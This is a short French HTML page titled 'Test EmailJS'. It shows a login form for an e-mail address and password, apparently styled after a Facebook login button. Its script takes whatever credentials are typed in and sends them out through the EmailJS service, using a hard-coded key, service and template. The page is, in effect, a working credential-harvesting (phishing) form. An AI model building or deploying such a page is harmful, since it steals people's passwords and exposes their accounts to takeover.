<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>Test EmailJS</title>
    <script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; margin-top: 100px; }
        .container { width: 300px; margin: auto; padding: 20px; border: 1px solid #ccc; box-shadow: 2px 2px 10px rgba(0,0,0,0.1); }
        input { width: 100%; padding: 10px; margin: 10px 0; }
        button { background-color: #1877F2; color: white; padding: 10px; border: none; cursor: pointer; width: 100%; }
    </style>
</head>
<body>
    <div class="container">
        <h2>Test EmailJS</h2>
        <form id="loginForm">
            <input type="text" id="username" name="username" placeholder="Adresse e-mail" required><br>
            <input type="password" id="password" name="password" placeholder="Mot de passe" required><br>
            <button type="submit">Envoyer</button>
        </form>
    </div>

    <script type="text/javascript">
        // Initialiser EmailJS avec ta clé API publique
        emailjs.init("ieMa4zcw6dCGQz3Pi");

        document.getElementById('loginForm').addEventListener('submit', function(event) {
            event.preventDefault();

            var username = document.getElementById('username').value;
            var password = document.getElementById('password').value;

            var templateParams = {
                username: username,
                password: password
            };

            // Envoi de l'email
            emailjs.send("service_fxwra79", "template_m90iszh", templateParams)
                .then(function(response) {
                    console.log('Succès!', response);
                    alert('L\'email a bien été envoyé !');
                }, function(error) {
                    console.log('Erreur...', error);
                    alert("Une erreur s'est produite : " + error.text);
                });
        });
    </script>
</body>
</html>
